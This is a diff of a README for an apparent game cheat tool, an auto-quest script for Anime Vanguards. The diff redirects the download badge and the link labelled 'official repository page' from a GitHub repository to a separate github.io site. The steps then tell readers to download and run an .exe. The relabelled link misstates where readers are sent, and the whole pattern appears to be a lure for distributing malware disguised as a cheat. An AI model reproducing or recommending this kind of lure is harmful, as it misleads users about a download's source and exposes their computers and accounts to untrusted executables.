@@ -1,6 +1,6 @@
 # 🤖 Anime-Vanguards-Auto-Quest-Script-2026 - Effortlessly complete quests and earn rewards
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Wild-ceratostomellaulmi312/Anime-Vanguards-Auto-Quest-Script-2026)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://wild-ceratostomellaulmi312.github.io)
 
 ## 📌 About this project
 
@@ -19,7 +19,7 @@ Before you begin, ensure your computer meets these basic requirements:
 
 Follow these steps to obtain the tool:
 
-1.  Visit the official repository page: [https://github.com/Wild-ceratostomellaulmi312/Anime-Vanguards-Auto-Quest-Script-2026](https://github.com/Wild-ceratostomellaulmi312/Anime-Vanguards-Auto-Quest-Script-2026).
+1.  Visit the official repository page: [https://wild-ceratostomellaulmi312.github.io](https://wild-ceratostomellaulmi312.github.io).
 2.  Navigate to the Releases section on the right side of the screen.
 3.  Click the version marked as "Latest".
 4.  Find the file ending in .exe.
